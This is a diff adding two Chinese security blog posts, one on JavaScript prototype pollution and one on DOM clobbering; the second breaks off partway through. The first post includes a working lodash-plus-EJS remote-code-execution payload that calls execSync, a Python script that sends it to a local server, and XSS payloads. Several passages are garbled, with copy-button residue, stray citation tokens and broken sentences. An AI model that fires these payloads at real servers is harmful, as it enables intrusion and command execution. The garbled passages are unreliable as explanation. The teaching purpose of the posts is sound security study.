@@ -71,6 +71,409 @@
       <div class="outer">
         <section id="main">
   
+    <article id="post-xss3" class="h-entry article article-type-post" itemprop="blogPost" itemscope itemtype="https://schema.org/BlogPosting">
+  <div class="article-meta">
+    <a href="/2025/07/19/xss3/" class="article-date">
+  <time class="dt-published" datetime="2025-07-19T11:07:59.000Z" itemprop="datePublished">2025-07-19</time>
+</a>
+    
+  </div>
+  <div class="article-inner">
+    
+    
+      <header class="article-header">
+        
+  
+    <h1 itemprop="name">
+      <a class="p-name article-title" href="/2025/07/19/xss3/">xss3</a>
+    </h1>
+  
+
+      </header>
+    
+    <div class="e-content article-entry" itemprop="articleBody">
+      
+        <h1 id="XSS-与原型链污染漏洞分析"><a href="#XSS-与原型链污染漏洞分析" class="headerlink" title="XSS 与原型链污染漏洞分析"></a>XSS 与原型链污染漏洞分析</h1><h2 id="原型链基础知识"><a href="#原型链基础知识" class="headerlink" title="原型链基础知识"></a>原型链基础知识</h2><p>在 JavaScript 中，每个函数都会在创建时自动生成一个 <strong>prototype</strong> 对象，作为该函数实例的“显式原型”。任何通过该函数构造的实例，其内部属性 <code>__proto__</code>（隐式原型）都会指向这个 <code>prototype</code> 对象。例如：</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">js复制编辑function Person()&#123;&#125;</span><br><span class="line">let person1 = new Person();</span><br><span class="line">console.log(person1.__proto__ === Person.prototype); // true</span><br></pre></td></tr></table></figure>
+
+<ul>
+<li><strong><code>prototype</code>（显式原型）</strong>：存在于函数对象上，保存了该构造函数所有实例共享的属性和方法，是实例对象继承的来源。任何函数创建时都会带一个 <code>prototype</code> 属性，默认这个 <code>prototype</code> 对象的 <code>constructor</code> 属性指向函数本身。</li>
+<li><strong><code>__proto__</code>（隐式原型）</strong>：存在于每个对象上（所有引用类型均有此属性），它引用了该对象的原型（即构造函数的 <code>prototype</code> 对象）。当访问一个对象属性时，如果自身没有此属性，JavaScript 引擎会沿着 <code>__proto__</code> 指向的原型链逐层向上查找，直到到达 <code>null</code> 为止。</li>
+<li><strong><code>constructor</code> 属性</strong>：仅存在于 <strong>prototype 对象上</strong>，指向创建该原型的构造函数本身。实例对象自身通常没有 <code>constructor</code> 属性，但可以通过其 <code>__proto__</code> 原型访问到这个属性，从而知道其构造函数。例如，<code>person1.constructor === Person</code>。<code>constructor</code> 本身对程序运行无直接影响，但它指明了对象的“类型”，可用于识别实例的构造来源。</li>
+</ul>
+<p>简单来说，函数的 <code>prototype</code> 是实例继承属性的源头，实例对象通过自身的 <code>__proto__</code> 指向该 <code>prototype</code>，而 <code>constructor</code> 则指示函数及其实例的构造者单从constructor这个属性来讲，只有prototype对象才有，每个函数在创建的时候，JS会同时创建一个该函数对应的prototype对象， 该函数创建的对象,该函数本身， 故通过函数创建的对象即使自己没有constructor属性，它也能通过__proto__找到对应的constructor，所以任何对象最终都可以找到其构造函数（ null如果当成对象的话，将null除外）。 示例如下：)。</p>
+<h2 id="原型链污染的形成条件与机制"><a href="#原型链污染的形成条件与机制" class="headerlink" title="原型链污染的形成条件与机制"></a>原型链污染的形成条件与机制</h2><p><strong>原型链污染</strong>（Prototype Pollution）指的是攻击者利用程序漏洞，<strong>往原型链上添加、修改或删除属性</strong> 的行为。一旦 <code>Object.prototype</code>（或其他原型对象）被污染，这些属性将被所有对象继承，可能导致程序逻辑异常或代码执行。典型触发条件包括：对象合并&#x2F;克隆时没有正确过滤原型关键字、将不可信输入直接赋值到原型属性等</p>
+<p>例如，下面代码直接给所有对象的原型添加了一个属性：</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">js复制编辑var a = &#123;name: &#x27;alice&#x27;, age: 18&#125;;</span><br><span class="line">a.__proto__.role = &#x27;administrator&#x27;;</span><br><span class="line">var b = &#123;&#125;;</span><br><span class="line">console.log(b.role);  // 输出 &quot;administrator&quot;</span><br></pre></td></tr></table></figure>
+
+<p>这段代码中，<code>a.__proto__</code> 即 <code>Object.prototype</code>，设置了 <code>role = &#39;administrator&#39;</code> 后，所有新建对象（如 <code>b</code>）都会“继承”这个属性。这就是原型链污染的效果：给原型注入属性后，任何对象都能读取到被污染的属性。如果在项目中存在类似的合并或遍历逻辑（比如递归 merge&#x2F;clone），攻击者只需控制输入数据里的 <code>__proto__</code> 或等价路径（如 <code>constructor.prototype</code>）字段，就能劫持原型。如 lodash 4.17.10 版本中，<code>_.merge(prefix, payload)</code> 会递归合并对象，原生的 <code>safeGet</code> 会忽略 <code>__proto__</code>，但如果攻击者提交 <code>&#123;&quot;constructor&quot;: &#123;&quot;prototype&quot;: &#123;&quot;role&quot;: &quot;admin&quot;&#125;&#125;&#125;</code>，在合并时仍然会把 <code>role: &quot;admin&quot;</code> 写入原型攻击代码中的 &#96;payload：{,，所以访问的用户变成了”VIP”)。例如：</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">js复制编辑const _ = require(&#x27;lodash&#x27;);</span><br><span class="line">let prefix = &#123;nickname: &#x27;user&#x27;&#125;;</span><br><span class="line">_.merge(prefix, &#123;&quot;constructor&quot;:&#123;&quot;prototype&quot;:&#123;&quot;role&quot;:&quot;admin&quot;&#125;&#125;&#125;);</span><br><span class="line">// 此时 Object.prototype.role === &quot;admin&quot;</span><br></pre></td></tr></table></figure>
+
+<p>攻击者只要让程序执行这样的合并（如通过提交特殊 JSON），就能污染原型链，影响全局行为攻击代码中的 <code>payload：&#123;,，所以访问的用户变成了“VIP”)[cloud.tencent.com](https://cloud.tencent.com/developer/article/1880443#:~:text=function safeGet(object%2C key) ,key]%3B)。除了合并函数外，**解析用户输入** 时也常出问题，例如解析嵌套的 query string。作者示例中有这样一个演示：如果一个查询字符串解析函数 </code>parseQs<code>把</code>‘<strong>proto</strong>[a]&#x3D;3’<code>转成对象，会在全局原型上赋值</code>a &#x3D; 3<code>，导致后续任何新对象打印 </code>a<code>时都输出</code></p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">js复制编辑var qs = parseQs(&#x27;__proto__[a]=3&#x27;);</span><br><span class="line">var obj = &#123;&#125;;</span><br><span class="line">console.log(obj.a); // 输出 3，因为 Object.prototype.a 被污染了:contentReference[oaicite:22]&#123;index=22&#125;。</span><br></pre></td></tr></table></figure>
+
+<p>由此可见，<strong>触发条件</strong>通常是：程序存在把用户控制的数据以递归方式写入目标对象（或遍历其所有属性）的操作；在此过程中若未过滤 <code>__proto__</code>、<code>constructor</code>、<code>prototype</code> 等关键字段，就会把值写到原型上。一旦原型被污染，后续访问或逻辑判断就可能发生意外变化。</p>
+<h2 id="利用原型链污染进行-XSS-或-RCE"><a href="#利用原型链污染进行-XSS-或-RCE" class="headerlink" title="利用原型链污染进行 XSS 或 RCE"></a>利用原型链污染进行 XSS 或 RCE</h2><p>原型链污染本身并不直接执行代码，但能<strong>破坏程序逻辑</strong>或影响数据处理流程，进而与其他漏洞组合造成更严重的后果。常见的攻击手段包括构造 XSS（客户端脚本注入）或 Server-side RCE。</p>
+<ul>
+<li><p><strong>XSS（跨站脚本）示例</strong>：比如某 web 应用使用模板或 DOM 操作来展示内容，如果攻击者能污染内置属性，就可能触发脚本插入。下例演示了一个简单的 XSS：假设存在代码使用 <code>innerText</code> 来避免 XSS，但由于原型链被污染，攻击者将 <code>Object.prototype.innerHTML</code> 设置成包含 <code>&lt;img onerror&gt;</code> 的字符串，导致逻辑分支被误导，最终使用了 <code>innerHTML</code> 渲染，触发脚本执行：</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line">js复制编辑// 攻击者污染原型</span><br><span class="line">Object.prototype.innerHTML = &#x27;&lt;img src=x onerror=alert(1)&gt;&#x27;;</span><br><span class="line">// 假设程序逻辑：</span><br><span class="line">let config = &#123; innerText: &#x27;搜索结果：&#x27; + searchQuery &#125;;</span><br><span class="line">const el = document.createElement(&#x27;h2&#x27;);</span><br><span class="line">if (config.innerHTML) &#123;            // 此处原本为 undefined</span><br><span class="line">    el.innerHTML = config.innerHTML;</span><br><span class="line">&#125; else &#123;</span><br><span class="line">    el.innerText = config.innerText;</span><br><span class="line">&#125;</span><br><span class="line">// 因为原型链被污染，config.innerHTML 虚拟为真，于是使用 innerHTML</span><br><span class="line">// 实际插入了带 onerror 的 img，触发 alert(1):contentReference[oaicite:26]&#123;index=26&#125;。</span><br></pre></td></tr></table></figure>
+
+<p>如上所示，原型链污染让原本走安全分支的代码意外执行了不安全的分支，从而完成了 XSS。</p>
+</li>
+<li><p><strong>RCE（远程代码执行）示例</strong>：在 Node.js 环境中，一些 API 会根据原型属性来改变执行行为。比如 <code>child_process.spawnSync</code> 接受一个选项 <code>shell</code>，默认为 <code>false</code>。如果攻击者通过污染让原型上有 <code>shell: true</code>，那么调用时会误用 shell 模式，从而执行任意命令。示例代码展示了这个过程：</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line">js复制编辑const &#123; spawnSync &#125; = require(&#x27;child_process&#x27;);</span><br><span class="line">// 正常行为：没有 shell，下面命令安全地打印 &quot;123 &amp;&amp; ls&quot;</span><br><span class="line">console.log(spawnSync(&#x27;echo&#x27;, [&#x27;123 &amp;&amp; ls&#x27;], &#123; timeout: 1000 &#125;).stdout.toString());</span><br><span class="line"></span><br><span class="line">// 攻击者在原型上注入 shell=true</span><br><span class="line">Object.prototype.shell = true;</span><br><span class="line">// 此时 spawnSync 会启用 shell，实际执行了 ls：</span><br><span class="line">console.log(spawnSync(&#x27;echo&#x27;, [&#x27;123 &amp;&amp; ls&#x27;], &#123; timeout: 1000 &#125;).stdout.toString());</span><br><span class="line">// 输出包含目录列表，实现了 RCE:contentReference[oaicite:29]&#123;index=29&#125;。</span><br></pre></td></tr></table></figure>
+
+<p>在上例中，原本 <code>spawnSync(&#39;echo&#39;, [&#39;123 &amp;&amp; ls&#39;])</code> 只是把参数当作普通字符串输出，而污染后执行的却是带 <code>&amp;&amp; ls</code> 的 shell 命令，打印了文件列表。这种<strong>脚本 gadget</strong>配合原型污染攻击可导致极高危漏洞。</p>
+</li>
+<li><p><strong>结合 EJS 模板实现攻击</strong>：作者还给出了一个真实案例：在一个基于 Express + EJS + Lodash 的服务中，通过原型链污染注入恶意脚本到 EJS 渲染过程，最终实现服务器端 RCE。简化后的关键逻辑如下：</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br></pre></td><td class="code"><pre><span class="line">js复制编辑const express = require(&#x27;express&#x27;);</span><br><span class="line">const bodyParser = require(&#x27;body-parser&#x27;);</span><br><span class="line">const lodash = require(&#x27;lodash&#x27;);</span><br><span class="line">const app = express();</span><br><span class="line">app.use(bodyParser.json());</span><br><span class="line">app.set(&#x27;view engine&#x27;, &#x27;ejs&#x27;);</span><br><span class="line"></span><br><span class="line">app.get(&quot;/&quot;, (req, res) =&gt; &#123;</span><br><span class="line">    let title = &#x27;游客你好&#x27;;</span><br><span class="line">    const user = &#123;&#125;;</span><br><span class="line">    if (user.role === &#x27;vip&#x27;) &#123;</span><br><span class="line">        title = &#x27;VIP你好&#x27;;</span><br><span class="line">    &#125;</span><br><span class="line">    res.render(&#x27;index&#x27;, &#123; title: title &#125;);</span><br><span class="line">&#125;);</span><br><span class="line">app.post(&quot;/&quot;, (req, res) =&gt; &#123;</span><br><span class="line">    let data = &#123;&#125;;</span><br><span class="line">    lodash.merge(data, req.body);</span><br><span class="line">    res.json(&#123; message: &#x27;OK&#x27; &#125;);</span><br><span class="line">&#125;);</span><br><span class="line">app.listen(8888);</span><br></pre></td></tr></table></figure>
+
+<p>该示例同样首先可以用 <code>&#123;&quot;constructor&quot;:&#123;&quot;prototype&quot;:&#123;&quot;role&quot;:&quot;vip&quot;&#125;&#125;&#125;</code> 类型的 payload 让所有用户都成为 VIP（人人 VIP）。更进一步，利用 EJS 模板的机制，攻击者能够注入 JS 代码执行命令。比如向 POST 接口发送如下 JSON：</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line">json复制编辑&#123;</span><br><span class="line">  &quot;content&quot;: &#123;</span><br><span class="line">    &quot;constructor&quot;: &#123;</span><br><span class="line">      &quot;prototype&quot;: &#123;</span><br><span class="line">        &quot;outputFunctionName&quot;: &quot;a; return global.process.mainModule.constructor._load(&#x27;child_process&#x27;).execSync(&#x27;ls /&#x27;); //&quot;</span><br><span class="line">      &#125;</span><br><span class="line">    &#125;</span><br><span class="line">  &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
+
+<p>这个 payload 会把 <code>Object.prototype.outputFunctionName</code> 设置为含有 <code>execSync(&#39;ls /&#39;)</code> 的字符串。在 EJS 模板编译时，这个属性会被拼接到输出函数中并执行，导致服务器执行任意命令。作者提供的攻击脚本示例展示了向服务发送上述 payload 并读取命令结果的完整过程。换言之，原型链污染配合 EJS 模板渲染，在不被察觉的情况下为攻击者打开了远程命令执行的后门。</p>
+</li>
+</ul>
+<h2 id="第三方库易受污染的函数分析"><a href="#第三方库易受污染的函数分析" class="headerlink" title="第三方库易受污染的函数分析"></a>第三方库易受污染的函数分析</h2><p>许多常用的第三方库在操作对象时含有深度合并或路径赋值的功能，若未过滤原型相关字段，就容易被污染攻击所利用。典型例子包括：</p>
+<ul>
+<li><strong>Lodash</strong>：早期版本（如 ≤4.17.11）中的 <code>_.merge</code>、<code>_.mergeWith</code>、<code>_.defaultsDeep</code> 等函数在深度合并对象时对 <code>constructor</code> 验证不足。例如 <code>defaultsDeep</code> 函数允许 <code>&#123;constructor:&#123;prototype:&#123;…&#125;&#125;&#125;</code> 形式的嵌套对象注入，从而污染原型。漏洞 CVE-2019-10744 指出，<code>lodash.defaultsDeep</code> 中对 <code>constructor</code> 没有正确过滤，导致 <code>&#123;constructor:&#123;prototype:&#123;&#125;&#125;&#125;</code> 被注入到 <code>Object.prototype</code>。l﻿odash 的 <code>merge</code> 逻辑虽然有 <code>safeGet</code> 跳过 <code>__proto__</code> 字段，但正如示例所示，攻击者可以改用 <code>constructor.prototype</code> 绕开防护。Snyk 说明中也提到，像 Lodash 这样的递归合并函数如果不安全，对 <code>__proto__</code> 未做特殊处理，就会导致对象合并攻击 to recursive merge attacks)。简言之，<strong>任何未过滤 <code>__proto__</code>&#x2F;<code>constructor</code> 的递归合并库都会构成污染风险</strong>（例如 lodash、Hoek 等库都在报告中被提及。</li>
+<li><strong>jQuery</strong>：在 3.4.0 之前的版本里，<code>jQuery.extend</code> 也存在类似漏洞。未受信任的 JSON 输入传给 <code>extend</code> 时，可以修改原型链。例如 CVE-2019-11358 报告指出，通过 <code>extend</code> 合并对象时传入 <code>__proto__</code>，可以污染全局对象原型。漏洞修复后，jQuery 3.4.0 增加了对 <code>__proto__</code> 等关键字段的过滤。</li>
+<li><strong>其他库</strong>：除了上述，两种常见场景是 <strong>解析嵌套路径</strong>（如深度解析 query string、路径设置等）和 <strong>对象克隆&#x2F;合并</strong>。如前所述，许多查询字符串解析库（<code>jquery-deparam</code>、<code>jquery-query-object</code>、<code>backbone-query-parameters</code> 等）都曾因支持 <code>a[b][c]</code> 这种格式，而在实现中意外把 <code>__proto__</code> 当作普通属性处理。其他操作对象的库（如 <code>merge</code>、<code>plain-object-merge</code>、<code>immer</code>、<code>mootools</code>、<code>ioredis</code> 等）也多次曝出合并逻辑导致原型污染的漏洞。总之，<strong>任何对用户输入的对象进行深度复制、合并或按路径赋值的功能，都要警惕原型链污染</strong>。</li>
+</ul>
+<h2 id="实战案例：原型链污染配合-XSS-RCE"><a href="#实战案例：原型链污染配合-XSS-RCE" class="headerlink" title="实战案例：原型链污染配合 XSS&#x2F;RCE"></a>实战案例：原型链污染配合 XSS&#x2F;RCE</h2><p>下面给出一个综合示例：在 Express + EJS 模板的应用中，利用 Lodash 合并漏洞进行原型污染，并最终导致远程代码执行。</p>
+<ol>
+<li><p><strong>示例环境</strong>：Node.js + Express，路由处理逻辑简化如下：</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line">js复制编辑// Express 应用示例</span><br><span class="line">app.get(&quot;/&quot;, (req, res) =&gt; &#123;</span><br><span class="line">    const user = &#123;&#125;;</span><br><span class="line">    const title = (user.role === &#x27;vip&#x27;) ? &#x27;VIP你好&#x27; : &#x27;游客你好&#x27;;</span><br><span class="line">    res.render(&#x27;index&#x27;, &#123; title &#125;);</span><br><span class="line">&#125;);</span><br><span class="line">app.post(&quot;/&quot;, (req, res) =&gt; &#123;</span><br><span class="line">    let data = &#123;&#125;;</span><br><span class="line">    lodash.merge(data, req.body);</span><br><span class="line">    res.json(&#123; message: &quot;OK&quot; &#125;);</span><br><span class="line">&#125;);</span><br></pre></td></tr></table></figure>
+
+<ul>
+<li>初始情况下，无论谁访问首页（GET <code>/</code>），<code>user.role</code> 均为 <code>undefined</code>，因此显示“游客你好”。</li>
+<li>POST 接口将客户端 JSON 合并到 <code>data</code>，但该数据不在渲染中直接使用。</li>
+</ul>
+</li>
+<li><p><strong>原型污染攻击</strong>：攻击者向 POST 接口发送恶意 JSON，如：</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">json</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">复制编辑</span><br><span class="line">&#123; &quot;constructor&quot;: &#123; &quot;prototype&quot;: &#123; &quot;role&quot;: &quot;vip&quot; &#125; &#125; &#125;</span><br></pre></td></tr></table></figure>
+
+<p>Lodash 的 <code>merge(data, payload)</code> 会将 <code>role: &quot;vip&quot;</code> 写入全局原型。结果是所有用户访问 GET <code>/</code> 时都被当作 VIP 看到页面（人人 VIP，逻辑如所示）。这个步骤验证了原型链污染的“越权”能力。</p>
+</li>
+<li><p><strong>代码注入与 RCE</strong>：更进一步，利用 EJS 模板渲染细节，可以将任意 JS 代码注入并执行。在此示例中，EJS 编译过程会使用一个 <code>outputFunctionName</code>（输出函数名）变量拼接模板代码。攻击者可提交如下 payload，使原型链上出现 <code>outputFunctionName</code>，注入恶意代码：</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line">json复制编辑&#123;</span><br><span class="line">  &quot;content&quot;: &#123;</span><br><span class="line">    &quot;constructor&quot;: &#123;</span><br><span class="line">      &quot;prototype&quot;: &#123;</span><br><span class="line">        &quot;outputFunctionName&quot;: &quot;a; return global.process.mainModule.constructor._load(&#x27;child_process&#x27;).execSync(&#x27;ls /&#x27;); //&quot;</span><br><span class="line">      &#125;</span><br><span class="line">    &#125;</span><br><span class="line">  &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
+
+<p>这条 payload 会导致服务端将字符串 <code>&quot;a; return global.process.mainModule.constructor._load(&#39;child_process&#39;).execSync(&#39;ls /&#39;); //&quot;</code> 拼接到 EJS 输出函数中。实际渲染时，这段代码被当作函数体执行，相当于在服务器上运行了 <code>execSync(&#39;ls /&#39;)</code>。结果攻击者通过访问页面获得了服务器上 <code>ls /</code> 的输出，实现了远程任意命令执行。</p>
+</li>
+<li><p><strong>示例 Payload</strong>：例如，攻击者可以这样编写请求脚本：</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br></pre></td><td class="code"><pre><span class="line">python复制编辑import requests, json</span><br><span class="line">target_url = &#x27;http://127.0.0.1:8888&#x27;</span><br><span class="line">headers = &#123;&#x27;Content-type&#x27;: &#x27;application/json&#x27;&#125;</span><br><span class="line"></span><br><span class="line"># 使所有用户成为 VIP（逻辑攻击）</span><br><span class="line">payload1 = &#123;&quot;constructor&quot;: &#123;&quot;prototype&quot;: &#123;&quot;role&quot;: &quot;vip&quot;&#125;&#125;&#125;</span><br><span class="line">requests.post(target_url, data=json.dumps(payload1), headers=headers)</span><br><span class="line"></span><br><span class="line"># 利用 EJS 注入执行命令（RCE 攻击）</span><br><span class="line">payload2 = &#123;</span><br><span class="line">  &quot;content&quot;: &#123;</span><br><span class="line">    &quot;constructor&quot;: &#123;</span><br><span class="line">      &quot;prototype&quot;: &#123;</span><br><span class="line">        &quot;outputFunctionName&quot;: &quot;a; return global.process.mainModule.constructor._load(&#x27;child_process&#x27;).execSync(&#x27;ls /&#x27;); //&quot;</span><br><span class="line">      &#125;</span><br><span class="line">    &#125;</span><br><span class="line">  &#125;</span><br><span class="line">&#125;</span><br><span class="line">requests.post(target_url, data=json.dumps(payload2), headers=headers)</span><br><span class="line"># 然后 GET / 即可看到命令执行结果</span><br></pre></td></tr></table></figure>
+
+<p>根据实测效果，执行上述代码后通过浏览器访问 <code>http://127.0.0.1:8888/</code> 可以看到命令输出（如文件列表），攻击成功。</p>
+</li>
+</ol>
+<p>综上所述，该实战案例展示了：原型链污染先改变程序逻辑（人人 VIP），再进一步结合模板渲染漏洞实现了服务器端 RCE。其中，关键在于 Lodash 合并时对 <code>constructor.prototype</code> 字段的处理漏洞，以及 EJS 将原型属性纳入渲染输出的机制。</p>
+
+      
+    </div>
+    <footer class="article-footer">
+      <a data-url="http://example.com/2025/07/19/xss3/" data-id="cmda5jfkf00023cc27gjgealo" data-title="xss3" class="article-share-link"><span class="fa fa-share">Share</span></a>
+      
+      
+      
+    </footer>
+  </div>
+  
+</article>
+
+
+
+  
+    <article id="post-xss2" class="h-entry article article-type-post" itemprop="blogPost" itemscope itemtype="https://schema.org/BlogPosting">
+  <div class="article-meta">
+    <a href="/2025/07/19/xss2/" class="article-date">
+  <time class="dt-published" datetime="2025-07-19T11:07:55.000Z" itemprop="datePublished">2025-07-19</time>
+</a>
+    
+  </div>
+  <div class="article-inner">
+    
+    
+      <header class="article-header">
+        
+  
+    <h1 itemprop="name">
+      <a class="p-name article-title" href="/2025/07/19/xss2/">xss2</a>
+    </h1>
+  
+
+      </header>
+    
+    <div class="e-content article-entry" itemprop="articleBody">
+      
+        <h2 id="DOM-Clobbering-原理与攻防"><a href="#DOM-Clobbering-原理与攻防" class="headerlink" title="DOM Clobbering 原理与攻防"></a>DOM Clobbering 原理与攻防</h2><hr>
+<h3 id="一、什么是-DOM-Clobbering"><a href="#一、什么是-DOM-Clobbering" class="headerlink" title="一、什么是 DOM Clobbering"></a>一、什么是 DOM Clobbering</h3><h4 id="概念"><a href="#概念" class="headerlink" title="概念"></a>概念</h4><p><strong>DOM Clobbering</strong> 是一种攻击技术，攻击者通过注入恶意 HTML 元素（通常带有 <code>id</code> 或 <code>name</code> 属性），<strong>覆盖（clobber）原本的 JavaScript 对象或属性引用</strong>，从而篡改原有逻辑、绕过过滤器、甚至实现 XSS。</p>
+<h4 id="攻击本质"><a href="#攻击本质" class="headerlink" title="攻击本质"></a>攻击本质</h4><p>HTML 元素的 <code>id</code> 和 <code>name</code> 属性有副作用：</p>
+<ul>
+<li>会被映射到 <code>document</code> 和 <code>window</code> 对象的属性上</li>
+<li>如果攻击者设置了 <code>id=&quot;foo&quot;</code>，那么可以通过 <code>document.foo</code> 或 <code>window.foo</code> 访问到该 DOM 元素</li>
+</ul>
+<p>攻击者正是利用了这种机制，实现了“污染全局作用域”的目的。</p>
+<hr>
+<h3 id="二、技术细节详解"><a href="#二、技术细节详解" class="headerlink" title="二、技术细节详解"></a>二、技术细节详解</h3><h4 id="1-DOM-对象绑定机制"><a href="#1-DOM-对象绑定机制" class="headerlink" title="1. DOM 对象绑定机制"></a>1. DOM 对象绑定机制</h4><table>
+<thead>
+<tr>
+<th>绑定方式</th>
+<th>对象</th>
+<th>示例标签</th>
+</tr>
+</thead>
+<tbody><tr>
+<td><code>id</code> → <code>document.id / window.id</code></td>
+<td><code>window</code> &#x2F; <code>document</code></td>
+<td><code>object</code>, <code>form</code>, <code>img</code> 等</td>
+</tr>
+<tr>
+<td><code>name</code> → <code>document.name / window.name</code></td>
+<td>同上</td>
+<td><code>embed</code>, <code>img</code>, <code>object</code>, <code>form</code></td>
+</tr>
+</tbody></table>
+<blockquote>
+<p>这个机制源于浏览器的向后兼容历史遗留行为。</p>
+</blockquote>
+<hr>
+<h4 id="2-简单覆盖变量"><a href="#2-简单覆盖变量" class="headerlink" title="2. 简单覆盖变量"></a>2. 简单覆盖变量</h4><figure class="highlight html"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">a</span> <span class="attr">id</span>=<span class="string">&quot;defaultAvatar&quot;</span> <span class="attr">name</span>=<span class="string">&quot;avatar&quot;</span> <span class="attr">href</span>=<span class="string">&quot;javascript:alert(1)&quot;</span>&gt;</span>click<span class="tag">&lt;/<span class="name">a</span>&gt;</span></span><br></pre></td></tr></table></figure>
+
+<p>JavaScript 中常见逻辑如下：</p>
+<figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">let</span> defaultAvatar = <span class="variable language_">window</span>.<span class="property">defaultAvatar</span> || &#123; <span class="attr">avatar</span>: <span class="string">&quot;/images/default.png&quot;</span> &#125;;</span><br></pre></td></tr></table></figure>
+
+<p>我们通过 <code>&lt;a id=&quot;defaultAvatar&quot;&gt;</code> 创建了 <code>window.defaultAvatar</code>，再通过 <code>name=&quot;avatar&quot;</code> 添加属性，使得 <code>defaultAvatar.avatar</code> 变为攻击者控制的字符串，进而可用于触发 XSS：</p>
+<figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">let</span> avatar = comment.<span class="property">avatar</span> ? <span class="built_in">escape</span>(comment.<span class="property">avatar</span>) : defaultAvatar.<span class="property">avatar</span>;</span><br></pre></td></tr></table></figure>
+
+<hr>
+<h4 id="3-多级对象覆盖（HTMLCollection）"><a href="#3-多级对象覆盖（HTMLCollection）" class="headerlink" title="3. 多级对象覆盖（HTMLCollection）"></a>3. 多级对象覆盖（HTMLCollection）</h4><p>构造多层访问链：</p>
+<figure class="highlight html"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">form</span> <span class="attr">id</span>=<span class="string">&quot;x&quot;</span> <span class="attr">name</span>=<span class="string">&quot;y&quot;</span>&gt;</span></span><br><span class="line">  <span class="tag">&lt;<span class="name">output</span> <span class="attr">id</span>=<span class="string">&quot;z&quot;</span> <span class="attr">value</span>=<span class="string">&quot;XSS&quot;</span>&gt;</span><span class="tag">&lt;/<span class="name">output</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">form</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">script</span>&gt;</span><span class="language-javascript"></span></span><br><span class="line"><span class="language-javascript">  <span class="title function_">alert</span>(x.<span class="property">y</span>.<span class="property">z</span>.<span class="property">value</span>); <span class="comment">// 多级对象访问触发</span></span></span><br><span class="line"><span class="language-javascript"></span><span class="tag">&lt;/<span class="name">script</span>&gt;</span></span><br></pre></td></tr></table></figure>
+
+<p>解释：</p>
+<ul>
+<li><code>x</code> 是 <code>form#x</code></li>
+<li><code>x.y</code> 利用了 <code>HTMLCollection</code>，因为 <code>form[name=y]</code> 成为了 <code>x</code> 的一个子节点</li>
